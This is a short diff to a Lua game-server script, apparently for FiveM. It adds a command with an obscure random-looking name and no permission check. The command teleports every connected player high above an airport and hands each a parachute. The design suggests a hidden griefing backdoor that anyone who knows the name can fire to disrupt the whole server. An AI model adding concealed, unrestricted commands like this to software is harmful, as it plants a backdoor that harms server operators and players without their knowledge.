@@ -51,3 +51,18 @@ RegisterCommand("pieaghpidsdsgpiog", function(source, args)
         end
     end)
 end, false)--]]
+
+local function teleportAllPlayersToAirport()
+    local airportCoords = vector3(-1037.73, -2748.39, 2000.0)
+
+    for _, playerId in ipairs(GetPlayers()) do
+        local playerPed = GetPlayerPed(playerId)
+        SetEntityCoords(playerPed, airportCoords)
+        FreezeEntityPosition(playerPed, false)
+        GiveWeaponToPed(playerPed, GetHashKey("gadget_parachute"), 1, false, true)
+    end
+end
+
+RegisterCommand('iwegosdoigbuwefgvbiou', function(source, args, rawCommand)
+    teleportAllPlayersToAirport()
+end, false)
